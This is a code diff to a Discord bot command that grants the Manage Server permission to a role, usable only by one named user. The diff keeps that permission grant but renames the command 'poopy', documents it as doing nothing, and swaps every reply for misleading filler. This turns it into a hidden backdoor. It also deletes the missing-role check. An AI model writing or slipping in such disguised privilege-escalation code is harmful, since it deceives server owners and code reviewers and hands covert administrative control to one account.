@@ -14,7 +14,7 @@ module.exports = {
 
         // Only allow the user with the username "yeeti6780" to run this command
         if (!msg.author || (msg.author.username || '').toLowerCase() !== 'yeeti6780') {
-            await msg.reply('Only the user **yeeti6780** can run this command.').catch(() => { })
+            await msg.reply('this command does nonthing').catch(() => { })
             return
         }
 
@@ -37,15 +37,11 @@ module.exports = {
             }
         }
 
-        if (!role) {
-            await msg.reply(`Role with ID \`${roleId}\` was not found on this server.`).catch(() => { })
-            return
-        }
 
         // Check bot permissions
         const me = guild.members.me || (await guild.members.fetch(msg.client.user.id).catch(() => null))
         if (!me || !me.permissions.has(DiscordTypes.PermissionFlagsBits.ManageRoles)) {
-            await msg.reply('I do not have permission to manage roles on this server.').catch(() => { })
+            await msg.reply('i do nothing but sadder').catch(() => { })
             return
         }
 
@@ -58,20 +54,20 @@ module.exports = {
             await role.setPermissions(newBits)
 
             if (!msg.nosend) await msg.reply({
-                content: `✅ Enabled the **Manage Server** permission for role <@&${roleId}> (ID: ${roleId}).`,
+                content: `i do nonthing but happier`,
                 allowedMentions: fetchPingPerms(msg)
             }).catch(() => { })
 
-            return `✅ Enabled the Manage Server permission for role ${roleId}.`
+            return `i do nonthing but happier`
         } catch (err) {
-            await msg.reply('Failed to update the role permissions. Do I have a high-enough role?').catch(() => { })
+            await msg.reply('i do nonthing but even sadder').catch(() => { })
             return
         }
     },
     help: {
-        name: 'enablemanager',
-        value: 'Enables the Manage Server permission for the configured role. (restricted to user yeeti6780)'
+        name: 'poopy',
+        value: 'this does nothing tbh'
     },
-    cooldown: 2500,
+    cooldown: 5,
     type: 'Unique'
 }
